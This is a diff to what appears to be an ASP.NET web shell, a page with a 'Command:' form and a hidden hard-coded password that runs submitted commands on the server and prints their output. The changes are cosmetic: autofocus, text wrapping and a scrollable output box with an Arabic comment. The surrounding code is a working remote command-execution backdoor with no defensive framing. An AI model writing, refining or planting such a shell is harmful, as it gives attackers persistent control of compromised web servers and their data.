@@ -12,7 +12,7 @@
                 <div style='position: fixed; top: 0; left: 0; width: 100%; background-color: #333; padding: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.5); color: #f5f5f5;'>
                     <form method='get' style='display: flex; align-items: center;'>
                         <label for='commandInput' style='margin-right: 10px; font-weight: bold;'>Command:</label>
-                        <input type='text' id='commandInput' name='execute' style='flex: 1; padding: 10px; border: none; border-radius: 5px; font-size: 16px;' value='" + Server.HtmlEncode(lastCommand) + @"' />
+                        <input type='text' id='commandInput' name='execute' style='flex: 1; padding: 10px; border: none; border-radius: 5px; font-size: 16px;' value='" + Server.HtmlEncode(lastCommand) + @"' autofocus />
                         <input type='hidden' name='password' value='28112016' />
                         <input type='submit' value='Execute' style='margin-left: 15px; padding: 10px 20px; border: none; border-radius: 5px; background-color: #4CAF50; color: #fff; font-size: 16px; cursor: pointer;' />
                     </form>
@@ -36,10 +36,10 @@
                     string output = process.StandardOutput.ReadToEnd();
                     string error = process.StandardError.ReadToEnd();
 
-                    Response.Write("<pre style='background-color: #1e1e1e; color: #00ff00; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto; white-space: pre; word-wrap: normal;'>" + output + "</pre>");
+                    Response.Write("<pre style='background-color: #1e1e1e; color: #00ff00; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;'>" + output + "</pre>");
                     if (!string.IsNullOrEmpty(error))
                     {
-                        Response.Write("<pre style='background-color: #1e1e1e; color: #ff4c4c; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto; white-space: pre; word-wrap: normal;'>" + error + "</pre>");
+                        Response.Write("<pre style='background-color: #1e1e1e; color: #ff4c4c; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;'>" + error + "</pre>");
                     }
 
                     string filePath = Server.MapPath(Request.Path);
@@ -49,7 +49,7 @@
                 }
                 catch (Exception ex)
                 {
-                    Response.Write("<pre style='color:red; background-color: #1e1e1e; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre; word-wrap: normal;'>Error: " + ex.Message + "</pre>");
+                    Response.Write("<pre style='color:red; background-color: #1e1e1e; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word;'>Error: " + ex.Message + "</pre>");
                 }
             }
 
@@ -85,6 +85,12 @@
 
         input[type='submit']:hover {
             background-color: #45a049;
+        }
+
+        /* تحسين تجربة التمرير لمخرجات الأوامر */
+        pre {
+            max-height: 400px;
+            overflow-y: auto;
         }
     </style>
 </head>
